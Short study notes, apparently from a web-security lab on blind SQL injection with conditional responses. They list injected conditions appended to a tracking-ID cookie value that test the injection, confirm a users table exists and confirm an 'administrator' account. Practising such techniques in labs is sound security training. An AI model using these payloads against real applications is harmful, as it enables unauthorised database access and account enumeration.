# Blind SQL injection with conditional responses
""" select tracking-id from tracking-table where trackingId= 'TlBaSrzfhyoEfnUn'
    if this trackingId exits -> query returns value -> welcome back message 

    select tracking-id from tracking-table where trackingId= 'TlBaSrzfhyoEfnUn' and 1 = 1 --' -> welcome back message 
    select tracking-id from tracking-table where trackingId= 'TlBaSrzfhyoEfnUn' and 1 = 0 --' -> NO welcome back message 

    Confirm that have a users table 
    select tracking-id from tracking-table where trackingId= 'TlBaSrzfhyoEfnUn' and (select 'x' from users LIMIT 1) = 'x' --' 
    
    Confirm that username administrator exits users table 
    select tracking-id from tracking-table where trackingId= 'TlBaSrzfhyoEfnUn' 
    and (select username from users where username = 'administrator') = 'administrator' --' 

"""
